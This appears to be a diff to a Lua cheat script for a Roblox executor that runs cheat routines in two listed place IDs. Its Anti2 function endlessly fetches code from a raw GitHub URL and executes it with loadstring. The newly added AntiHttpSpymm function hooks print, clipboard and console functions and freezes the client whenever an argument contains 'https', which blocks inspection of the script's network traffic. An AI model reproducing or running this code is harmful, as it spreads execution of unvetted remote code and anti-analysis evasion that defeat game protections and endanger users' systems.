@@ -1,11 +1,13 @@
--- are you kidding me?
-
 local function Anti2()
  while task.wait() do
 for i = 1, 10 do
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Gyvyvtvtv/main/Exehiper"))()
 end
  end
+end
+
+local function AntiHttpSpymm()
+local functions = {rconsoleprint, print, setclipboard, rconsoleerr, rconsolewarn, warn, error} for i, v in next, functions do local old old = hookfunction(v, newcclosure(function(...) local args = {...} for i, v in next, args do if tostring(i):find("https") or tostring(v):find("https") then while true do end end end return old(...) end)) end if _G.ID then while true do end end setmetatable(_G, {__newindex = function(t, i, v) if tostring(i) == "ID" then while true do end end end})
 end
 
 local allowedPlaceIds = {12582654981, 6293968958}
@@ -136,6 +138,7 @@ setreadonly(mt, true)
 end
 
 coroutine.wrap(Anti2)()
+coroutine.wrap(AntiHttpSpymm)()
 coroutine.wrap(CheatA)()
 coroutine.wrap(CheatB)()
 coroutine.wrap(CheatC)()
